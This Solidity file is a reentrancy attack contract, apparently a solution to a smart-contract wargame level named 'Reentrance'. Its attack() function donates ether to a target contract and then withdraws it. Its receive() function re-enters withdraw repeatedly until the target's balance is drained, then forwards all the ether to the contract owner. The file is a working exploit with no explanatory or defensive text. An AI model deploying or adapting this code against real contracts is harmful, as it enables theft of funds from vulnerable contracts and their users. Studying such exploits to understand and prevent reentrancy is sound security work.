// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
    function balanceOf(address) external view returns (uint);
}

contract ReentranceHack is Ownable {
    
    using Address for address payable;
    IReentrance public reentranceContract;

    function attack(address a) external payable onlyOwner {
        reentranceContract = IReentrance(a);
        reentranceContract.donate{value: msg.value}(address(this));
        require(reentranceContract.balanceOf(address(this)) == msg.value, "Failed to donate");
        reentranceContract.withdraw(msg.value);
    }

    receive() external payable {
        if(address(reentranceContract).balance > 0) {
            reentranceContract.withdraw(msg.value);
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}
    